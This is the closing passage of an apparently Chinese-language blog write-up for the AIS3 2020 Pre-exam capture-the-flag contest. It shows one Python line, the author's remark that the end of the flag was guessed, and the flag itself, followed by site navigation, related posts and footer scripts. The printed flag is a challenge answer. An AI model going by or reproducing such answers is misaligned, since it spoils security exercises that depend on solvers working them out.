    <span class="n">cur_min</span> <span class="o">=</span> <span class="n">Manager</span><span class="p">().</span><span class="nb">list</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">doc</span><span class="p">)))))</span>

</code></pre></div></div>

<p>我戳到 <code class="language-plaintext highlighter-rouge">AIS3{A1r1ght_U_4r3_my_3n3</code> 這裡大概就知道剩下應該是 <code class="language-plaintext highlighter-rouge">enemies</code>，所以剛好就猜中了。</p>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{A1r1ght_U_4r3_my_3n3ies}</code></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      <a href="/tags/#zh-tw" class="page__taxonomy-item" rel="tag">zh-tw</a>
    
    </span>
  </p>




  


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      <a href="/categories/#writeup" class="page__taxonomy-item" rel="tag">writeup</a>
    
    </span>
  </p>


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-06-28T00:00:00+08:00">June 28, 2020</time></p>


      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?via=StillAzureH&text=AIS3+2020+Pre-exam+Writeup+%28%E4%B8%AD%E6%96%87%29%20https%3A%2F%2Fstillu.cc%2Fwriteup%2F2020%2F06%2F28%2Fais3-preexam-zh-2020%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fstillu.cc%2Fwriteup%2F2020%2F06%2F28%2Fais3-preexam-zh-2020%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fstillu.cc%2Fwriteup%2F2020%2F06%2F28%2Fais3-preexam-zh-2020%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/writeup/2020/06/23/capture-the-nitro/" class="pagination--pager" title="Capture the Nitro Writeup
">Previous</a>
    
    
      <a href="/rambling/2020/06/29/internet-and-its-absurdity/" class="pagination--pager" title="The Current State of the Internet and its Absurdity
">Next</a>
    
  </nav>

    </div>

    
      <div class="page__comments">
  
  
      <h4 class="page__comments-title">Leave a comment</h4>
      <section id="utterances-comments"></section>
    
</div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You may also enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/ida-tips/2022/01/22/saved-desktops-across-32bit-64bit/" rel="permalink">IDA Trickeries #1: Using Saved Desktop Across IDAs
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2022-01-22T00:00:00+08:00">January 22, 2022</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          1 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">So like… who at Hex-rays implemented this?
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/threat-spotlight/2021/11/13/domain-fronting-fastly/" rel="permalink">Threat Spotlight - Domain Fronting
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2021-11-13T00:00:00+08:00">November 13, 2021</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          5 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Fast(ly) but deadly.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/personal/2021/10/29/barinsta-and-facebook/" rel="permalink">Facebook, Monopoly, and Barinsta
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2021-10-29T00:00:00+08:00">October 29, 2021</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          8 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Facebook and its anti-competitive strategy.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/personal/2021/07/12/lockdown-taiwan-2021/" rel="permalink">Lockdown, Taiwan, 2021
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2021-07-12T00:00:00+08:00">July 12, 2021</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          2 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Impact of lockdown in Taiwan and my personal life.
</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    

    
      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
    
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 Still Hsu. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-N6FGTZBMTZ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-N6FGTZBMTZ', { 'anonymize_ip': false});
</script>






    <script>
  'use strict';

  (function() {
    var commentContainer = document.querySelector('#utterances-comments');

    if (!commentContainer) {
      return;
    }

    var script = document.createElement('script');
    script.setAttribute('src', 'https://utteranc.es/client.js');
    script.setAttribute('repo', 'Still34/landing');
    script.setAttribute('issue-term', 'pathname');
    script.setAttribute('theme', 'github-dark');
    script.setAttribute('crossorigin', 'anonymous');

    commentContainer.appendChild(script);
  })();
</script>

  





  </body>
</html>
